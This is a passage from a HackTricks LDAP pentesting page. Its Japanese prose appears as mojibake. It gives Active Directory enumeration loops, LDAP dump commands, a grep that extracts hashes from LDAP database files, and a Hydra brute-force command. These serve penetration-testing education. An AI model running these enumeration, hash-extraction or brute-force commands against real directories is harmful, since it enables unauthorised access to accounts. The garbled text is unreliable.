./enum-groups | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do echo "$name"; ./enum-members --by-name "$name"; echo -e "========================\n"; done

#Get description of each user
./adtool -a search-user --name CN="*" --keytab=/etc/krb5.keytab -n <Username> | grep "CN" | while read line; do
echo "$line";
./adtool --keytab=/etc/krb5.keytab -n <username> -a lookup-object --dn="$line" --attr "description";
echo "======================"
done
```
## ã‚°ãƒ©ãƒ•ã‚£ã‚«ãƒ«ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹

### Apache Directory

[**ã“ã“ã‹ã‚‰Apache Directoryã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**](https://directory.apache.org/studio/download/download-linux.html)ã§ãã¾ã™ã€‚[ã“ã®ãƒ„ãƒ¼ãƒ«ã®ä½¿ç”¨ä¾‹ã¯ã“ã¡ã‚‰](https://www.youtube.com/watch?v=VofMBg2VLnw\&t=3840s)ã«ã‚ã‚Šã¾ã™ã€‚

### jxplorer

LDAPã‚µãƒ¼ãƒãƒ¼ç”¨ã®ã‚°ãƒ©ãƒ•ã‚£ã‚«ãƒ«ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã‚’[ã“ã¡ã‚‰](http://www.jxplorer.org/downloads/users.html)ã‹ã‚‰ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã§ãã¾ã™ã€‚

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€_ / opt / jxplorer_ã«ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¾ã™ã€‚

![](<../.gitbook/assets/image (22) (1).png>)

### Godap

[https://github.com/Macmod/godap](https://github.com/Macmod/godap)ã§ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚

## ã‚±ãƒ«ãƒ™ãƒ­ã‚¹ã‚’ä»‹ã—ãŸèªè¨¼

`ldapsearch`ã‚’ä½¿ç”¨ã—ã¦ã€ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿`-Y GSSAPI`ã‚’ä½¿ç”¨ã—ã¦ã€**NTLM**ã§ã¯ãªã**ã‚±ãƒ«ãƒ™ãƒ­ã‚¹**ã«å¯¾ã—ã¦**èªè¨¼**ã§ãã¾ã™ã€‚

## POST

ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãŒå«ã¾ã‚Œã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å ´åˆï¼ˆ_ / var / lib / ldap_ã«ã‚ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼‰ã€‚æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ãƒãƒƒã‚·ãƒ¥ã‚’æŠ½å‡ºã§ãã¾ã™ï¼š
```bash
cat /var/lib/ldap/*.bdb | grep -i -a -E -o "description.*" | sort | uniq -u
```
### æ§‹æˆãƒ•ã‚¡ã‚¤ãƒ«

* ä¸€èˆ¬
* containers.ldif
* ldap.cfg
* ldap.conf
* ldap.xml
* ldap-config.xml
* ldap-realm.xml
* slapd.conf
* IBM SecureWay V3 ã‚µãƒ¼ãƒãƒ¼
* V3.sas.oc
* Microsoft Active Directory ã‚µãƒ¼ãƒãƒ¼
* msadClassesAttrs.ldif
* Netscape Directory Server 4
* nsslapd.sas\_at.conf
* nsslapd.sas\_oc.conf
* OpenLDAP ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚µãƒ¼ãƒãƒ¼
* slapd.sas\_at.conf
* slapd.sas\_oc.conf
* Sun ONE Directory Server 5.1
* 75sas.ldif
```
Protocol_Name: LDAP    #Protocol Abbreviation if there is one.
Port_Number:  389,636     #Comma separated if there is more than one.
Protocol_Description: Lightweight Directory Access Protocol         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for LDAP
Note: |
The use of LDAP (Lightweight Directory Access Protocol) is mainly for locating various entities such as organizations, individuals, and resources like files and devices within networks, both public and private. It offers a streamlined approach compared to its predecessor, DAP, by having a smaller code footprint.

https://book.hacktricks.xyz/pentesting/pentesting-ldap

Entry_2:
Name: Banner Grab
Description: Grab LDAP Banner
Command: nmap -p 389 --script ldap-search -Pn {IP}

Entry_3:
Name: LdapSearch
Description: Base LdapSearch
Command: ldapsearch -H ldap://{IP} -x

Entry_4:
Name: LdapSearch Naming Context Dump
Description: Attempt to get LDAP Naming Context
Command: ldapsearch -H ldap://{IP} -x -s base namingcontexts

Entry_5:
Name: LdapSearch Big Dump
Description: Need Naming Context to do big dump
Command: ldapsearch -H ldap://{IP} -x -b "{Naming_Context}"

Entry_6:
Name: Hydra Brute Force
Description: Need User
Command: hydra -l {Username} -P {Big_Passwordlist} {IP} ldap2 -V -f
```
<details>

<summary><strong>ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ã”è¦§ãã ã•ã„
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã™ã‚‹**

</details>
